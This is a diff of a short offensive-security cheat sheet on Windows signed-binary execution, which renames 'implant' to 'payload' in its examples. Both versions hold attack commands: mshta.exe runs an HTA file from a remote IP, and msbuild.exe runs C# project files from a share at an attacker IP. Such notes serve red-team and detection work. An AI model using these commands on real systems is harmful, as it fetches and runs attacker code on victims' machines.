@@ -3,21 +3,21 @@
 ## 01 - MSHTA
 
 ```
-C:\> mshta.exe %CD%\implant.hta
+C:\> mshta.exe %CD%\payload.hta
 
-C:\> mshta.exe <drive_letter>:\absolute\path\to\implant.hta
+C:\> mshta.exe <drive_letter>:\absolute\path\to\payload.hta
 
-C:\> mshta.exe http[s]://<IP>/implant.hta
+C:\> mshta.exe http[s]://<IP>/payload.hta
 ```
 
 ## 02 - MSBuild
 
-Execute C# project implants.
+Execute C# project payloads.
 
 ```
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.csproj
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\payload.csproj
 
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.xml
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\payload.xml
 ```
 
 ---
